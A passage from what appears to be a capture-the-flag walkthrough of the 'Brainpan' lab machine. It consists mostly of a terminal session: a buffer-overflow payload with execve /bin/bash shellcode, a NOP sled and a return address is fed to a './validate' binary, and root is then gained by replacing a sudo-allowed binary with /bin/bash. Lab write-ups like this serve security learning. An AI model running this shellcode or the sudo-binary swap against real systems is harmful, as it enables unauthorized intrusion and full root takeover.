puck@brainpan:/usr/local/bin$ ./validate `python -c 'print("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x90"*83 + "\xaf\x84\x04\x08"*4)'`
<x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x90"*83 + "\xaf\x84\x04\x08"*4)'`  
bash-4.2$ 

bash-4.2$ whoami
whoami
anansi
bash-4.2$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
bash-4.2$ cd /home/anansi/bin/    
cd /home/anansi/bin/
bash-4.2$ mv anansi_util anansi_util_back
mv anansi_util anansi_util_back
bash-4.2$ echo /bin/bash > anansi_util
echo /bin/bash > anansi_util
bash-4.2$ chmod 777 anansi_util
chmod 777 anansi_util
bash-4.2$ sudo ./anansi_util
sudo ./anansi_util
root@brainpan:/home/anansi/bin# whoami
whoami
root
root@brainpan:/home/anansi/bin# 
```

Once again, it is **[[SHELLCODE](http://shell-storm.org/shellcode/files/shellcode-399.php) (34bytes) | NOPS over EBP as well (83 bytes)| Return address/ EIP (4 bytes)]**
